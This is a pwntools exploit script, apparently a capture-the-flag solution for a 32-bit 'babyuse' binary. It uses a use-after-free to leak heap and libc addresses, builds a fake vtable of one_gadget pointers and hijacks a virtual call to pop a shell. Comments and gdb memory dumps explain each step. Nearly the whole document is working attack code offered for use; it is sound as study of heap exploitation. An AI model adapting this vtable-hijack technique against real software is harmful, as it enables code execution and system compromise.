from pwn import *
import sys 

#context(terminal=['tmux', 'new-window'])
context(os='linux', arch='i386',endian="little")

e = ELF("./babyuse.dms")
libc = ELF("./libc.so.6")
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
	gdb.attach(p)
elif sys.argv[1] == "live":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def buy(id, lenname, name):
	log.info("Allocating...")
	p.sendline("1")
	p.recvuntil("QBZ95\n")	
	p.sendline(str(id))
	p.recvline()
	p.sendline(str(lenname))
	p.recvline()
	p.sendline(name)
	p.recvuntil("Exit\n")

def selectgun(idx):
	log.info("Selecting...")
	p.sendline("2")
	p.recvuntil("Select a gun\n")
	p.sendline(str(idx))

	p.recvuntil("Exit\n")

def listguns():
	p.sendline("3")	
	p.recvline()
	data = p.recvuntil("Menu:")
	p.recvuntil("Exit\n")

	return data

def renamegun(idx, newlen, newname):
	log.info("Renaming...")
	p.sendline("4")
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(newlen))
	p.recvline()
	p.sendline(newname)
	p.recvuntil("Exit\n")

def usegun(action, dorecv=True):
	log.info("Using...")
	p.sendline("5")
	data1 = p.recvline()
	p.recvuntil("menu\n")
	p.sendline(str(action))

	if (dorecv):
		data = p.recvline()
		p.sendline("4")
		p.recvuntil("Exit\n")

		return data1

def getLeak():
	data = p.recv(1024)
	p.sendline("5")
	leak = p.recv(1024).split("gun")[1]
	return leak

def dropgun(idx):
	log.info("Freeing...")
	p.sendline("6")
	p.recvline()
	p.sendline(str(idx))
	p.recvuntil("Exit\n")

def info(s):
	log.info(s)

def exploit():

	log.success("Sending Exploit...")

	p.recvuntil("Exit\n")

	log.info("Leaking heap address")

	buy(1, 8, "A" * 7) # fast bin 0 (8 bytes for address alignment)
	buy(1, 8, "B" * 7) # fast bin 0 (8 bytes for address alignment)

	selectgun(1)
	dropgun(0) # free chunk 0 # drop gun will free the new name pointer and place it in the fast bin list as well as link the previously freed fastbin inside of the FD of the chunk (singly linked)
	dropgun(1)

	heapleak = u32(usegun(0)[len("Select gun "):-4]) # read heap pointer (FD heap leak)

	log.success("Heap Leak: " + hex(heapleak))

	dropgun(0)

	buy(1, 256, "AAAABBBB") # small bin chunk 0 
	buy(1, 256, "AAAABBBB") # small bin chunk 0 
	buy(1, 256, "CCCCDDDD")	# small bin chunk 1
	
	dropgun(1) # free chunk 1

	log.info("Leaking libc address")
	
	libcleak = u32(usegun(0)[len("Select gun "):len("Select gun ")+4]) # libc leak (main_arena) (doubly-linked chunks)

	log.info("Calculating offsets")

	libc = libcleak - 0x1b27b0  # offset to libc base
	one_gadget = libc + 0x3ac69 # one gadget		
	heap_dest = heapleak + 68   #  + 68 (where fake vtable will be allocated) (predictable heap addresses are nice) (name pointer + 4)

	log.success("LIBC leak : %s" % hex(libcleak))
	log.success("LIBC base : %s" % hex(libc))
	log.success("One gadget : %s" % hex(one_gadget))
	log.success("Heap destination : %s" % hex(heap_dest))

	log.info("Crafting fake vtable") 

	"""

		+gef>  x/20wx 0x5655ea10
	0x5655ea10:     0x56556d30      0x5655ea28      0x0000000f      0x0000000f 
	0x5655ea20:     0x00000000      0x00000029      0x41414141      0x41414141
	0x5655ea30:     0x00000000      0x00000000      0x00000000      0x00000000
	0x5655ea40:     0x00000000      0x00000000      0x00000000      0x000205b9
	0x5655ea50:     0x00000000      0x00000000      0x00000000      0x00000000

	0x56556d30 = vtable
	0x5655ea28 = name ptr
	0x0000000f = current ammo
	0x0000000f = max ammo


	+gef>  x/20wx 0x5655ea10
	0x5655ea10:     0x56556d30      0x5655ea28      0x0000000f      0x0000000f
	0x5655ea20:     0x00000000      0x00000029      0x41414141      0x00000000
	0x5655ea30:     0x00000000      0x00000000      0x00000000      0x00000000
	0x5655ea40:     0x00000000      0x00000000      0x00000000      0x000205b9
	0x5655ea50:     0x00000000      0x00000000      0x00000000      0x00000000
	+gef>  rwatch *0x5655ea10

	SHOOT:

		0x565563a6                  jmp    0x565563ea
		0x565563a8                  mov    eax, DWORD PTR [ebp-0x34]
		0x565563ab                  mov    eax, DWORD PTR [eax]
	->	0x565563ad                  mov    eax, DWORD PTR [eax]
		0x565563af                  sub    esp, 0xc
		0x565563b2                  push   DWORD PTR [ebp-0x34]
		0x565563b5                  call   eax
		0x565563b7                  add    esp, 0x10
		0x565563ba                  jmp    0x565563fa

	RELOAD:

	   0x565563b6                  rol    BYTE PTR [ebx+0x3eeb10c4], 1
	   0x565563bc                  mov    eax, DWORD PTR [ebp-0x34]
	   0x565563bf                  mov    eax, DWORD PTR [eax]
	-> 0x565563c1                  add    eax, 0x4 (OFFSET TO RELOAD)
	   0x565563c4                  mov    eax, DWORD PTR [eax]
	   0x565563c6                  sub    esp, 0xc
	   0x565563c9                  push   DWORD PTR [ebp-0x34]
	   0x565563cc                  call   eax
	   0x565563ce                  add    esp, 0x10

		eax = 0x56556d30

	Gun->Shoot vtable lookup
	*0x56556590 (
	   [sp + 0x0] = 0x5655ea10 -> 0x56556d30 -> 0x56556590 -> push ebp
	)

	Gun->Reload vtable lookup
	*0x565565d4 (
	   [sp + 0x0] = 0x5655ea10 -> 0x56556d30 -> 0x56556590 ->  push ebp
	)


	0x56556d30 = SHOOT
	0x56556d30 + 4 = RELOAD
	0x56556d30 + 8 = INFO

	VTABLE HIJACK:

	+gef>  x/20wx 0x56688a70
	0x56688a70:     0x56688a4c      0x56688a4c      0x00000000      0x0000000f
	0x56688a80:     0x00000000      0x00000029      0x56688a40      0x59595959
	0x56688a90:     0x00000000      0x00000000      0x00000000      0x00000000
	0x56688aa0:     0x00000000      0x00000000      0x00000000      0x00000019
	0x56688ab0:     0x565d5d30      0x56688a70      0x0000000f      0x0000000f
	+gef>  x/20wx 0x56688a4c
	0x56688a4c:     0xf7db0c69      0x43434343      0x44444444      0x45454545
	0x56688a5c:     0x00000000      0x00000000      0x00000000      0x00000000
	0x56688a6c:     0x00000019      0x56688a4c      0x56688a4c      0x00000000
	0x56688a7c:     0x0000000f      0x00000000      0x00000029      0x56688a40
	0x56688a8c:     0x59595959      0x00000000      0x00000000      0x00000000
	

	*0xfffffffff7db0c69 (
	   [sp + 0x0] = 0x56688a70 -> 0x56688a4c -> 0xf7db0c69 ->  mov eax, DWORD PTR [esi-0xb8]
	)

	"""

	# Fake vtable

	payload = p32(one_gadget)
	payload += p32(one_gadget)	# VTable Shoot
	payload += p32(one_gadget)	# VTable Reload
	payload += p32(one_gadget)	# VTable ShowInfo
	payload += p32(one_gadget)

	log.info("Payload Length: " + str(len(payload)))

	dropgun(0) # remove buffer chunk

	buy(1, 32, payload)		# 0 # 32 bytes
	buy(1, 32, "XXXXYYYY")	# 2 # 32 bytes
	buy(1, 32, "ZZZZZZZZ")	# 3	# 32 bytes

	# Allocate the name ptr slightly larger than the base object size and larger then the next gun object name ptr so when we create our new gun it will allocate on top of a gun chunk for the new object (gun) and use another gun chunk for the name pointer (UAF), overwriting a guns vtable

	"""

	Fastbins[idx=0, size=0x10] 0x00
	Fastbins[idx=1, size=0x18]  <-  Chunk(addr=0x5655ea10, size=0x18, flags=PREV_INUSE) (GUN)
	Fastbins[idx=2, size=0x20] 0x00
	Fastbins[idx=3, size=0x28]  <-  Chunk(addr=0x5655ea28, size=0x28, flags=PREV_INUSE) (NAME)
	Fastbins[idx=4, size=0x30] 0x00
	Fastbins[idx=5, size=0x38] 0x00
	Fastbins[idx=6, size=0x40] 0x00

	When you free (drop) a gun, it will free the object (0x18 bytes) and the name ptr (0x28 bytes if name size = 32)

	"""

	selectgun(2) # Target chunk containing new vtable selected
	
	dropgun(0) # Free chunk 0 # free chunk before chunk2 # If this is not freed, the the name pointer will be heap_dest for the new object instead of chunk0's one_gadget # if this chunk is not freed the alignment (malloc freed chunk structure) for the use-after-free is broken due to malloc zero'ing out the object when dropped (first entry in singly-linked list). The next freed chunk after this one will point to the previously freed chunk (singly-linked list)

	dropgun(2) # Free chunk 2 

	"""
	+gef>  x/20wx 0x56bc9ab0
	0x56bc9ab0:     0x5662ed30      0x56bc9a70      0x0000000f      0x0000000f
	0x56bc9ac0:     0x00000000      0x00000029      0x56bc9a80      0x46464646 <- name contains pointer to chunk 2
	0x56bc9ad0:     0x00000000      0x000s00000      0x00000000      0x00000000
	0x56bc9ae0:     0x00000000      0x00000000      0x00000000      0x00000061
	0x56bc9af0:     0xf7f757b0      0xf7f757b0      0x00000000      0x00000000
	+gef>  x/20wx 0x56bc9a80
	0x56bc9a80:     0x00000000      0x00000029      0x56bc9a40      0x59595959 <- Pointer to chunk 1
	0x56bc9a90:     0x00000000      0x00000000      0x00000000      0x00000000
	0x56bc9aa0:     0x00000000      0x00000000      0x00000000      0x00000019
	0x56bc9ab0:     0x5662ed30      0x56bc9a70      0x0000000f      0x0000000f
	0x56bc9ac0:     0x00000000      0x00000029      0x56bc9a80      0x46464646

	+gef>  x/20wx 0x56bc9a40
	0x56bc9a40:     0x00000000      0x00000029      0x00000000      0xf7dfdc69 <- chunk 1 with one gadget
	0x56bc9a50:     0x46464646      0x47474747      0x48484848      0x00000000
	0x56bc9a60:     0x00000000      0x00000000      0x00000000      0x00000019
	0x56bc9a70:     0x56bc9a4c      0x56bc9a4c      0x00000000      0x0000000f
	0x56bc9a80:     0x00000000      0x00000029      0x56bc9a40      0x59595959

	"""

	dropgun(3) # Free chunk 3

	payload = p32(heap_dest) # 16 byte vtable dest overwrite (address to fake vtable)
	payload += p32(heap_dest)
	payload += p32(0x0000000f)
	payload += p32(0x0000000f)

	log.info("Payload Length: " + str(len(payload)))

	# allocate new gun with 16 bytes so it allocates a new object at freed chunk 3 and uses chunk2 to store class information

	"""
	
	New corrupted object. Another object has replaced the name pointer which points to fake vtable

	+gef>  x/20wx 0x581b3ab0
	0x581b3ab0:     0x565b0d30      0x581b3a70      0x0000000f      0x0000000f
	0x581b3ac0:     0x00000000      0x00000029      0x581b3a80      0x46464646
	0x581b3ad0:     0x00000000      0x00000000      0x00000000      0x00000000
	0x581b3ae0:     0x00000000      0x00000000      0x00000000      0x00000061
	0x581b3af0:     0xf7ed57b0      0xf7ed57b0      0x00000000      0x00000000

	"""

	buy(1, 16, payload) # allocate object with new vtable # overwrite vtable address to fake vtable

	"""
	+gef>  x/20wx 0x58329ab0
	0x58329ab0:     0x56564d30      0x58329c70      0x0000000f      0x0000000f
	0x58329ac0:     0x00000000      0x00000029      0x00000000      0x5a5a5a5a
	0x58329ad0:     0x00000000      0x00000000      0x00000000      0x00000000
	0x58329ae0:     0x00000000      0x00000000      0x00000000      0x00000181
	0x58329af0:     0xf7f967b0      0x58329a20      0x00000000      0x00000000
	+gef>  x/20wx 0x58329c70
	0x58329c70:     0x58329a64      0x58329a64      0x0000000f      0x0000000f
	0x58329c80:     0x00000000      0x00020381      0x43434343      0x44444444
	0x58329c90:     0x00000000      0x00000000      0x00000000      0x00000000
	0x58329ca0:     0x00000000      0x00000000      0x00000000      0x00000000
	0x58329cb0:     0x00000000      0x00000000      0x00000000      0x00000000
	+gef>  x/20wx 0x58329a64
	0x58329a64:     0xf7e1ec69      0xf7e1ec69      0xf7e1ec69      0xf7e1ec69
	0x58329a74:     0x00000000      0x00000000      0x00000000      0x00000060
	0x58329a84:     0x00000028      0x58585858      0x59595959      0x00000000
	0x58329a94:     0x00000000      0x00000000      0x00000000      0x00000000
	0x58329aa4:     0x00000000      0x00000000      0x00000019      0x56564d30

	chunkgun3 = target_object
	chunkgun2 = target_object_name_ptr
	chunkgun0 = target_object_name_value

	GUN0 = gun_0_struct_2, gun_0_name_3 
	GUN2 = gun_2_struct_0, gun_2_name_1
	GUN3 = gun_3_struct_0, gun_3_name_1

	NEWOBJ is allocated from GUN3, NEWOBJNAME is allocated from GUN2 NEWOBJNAMEVAL contains GUN0

	b0 = GUN0
	70 = GUN2

	NEWOBJECT(GUN3)->NEWOBJECTNAMEPTR(GUN2)->NEWOBJECTNAMEVAL(GUN0)

	"""

	log.success("Popping shell")

	usegun(1, False) # call fake vtable and execute one_gadget

	p.interactive()

exploit()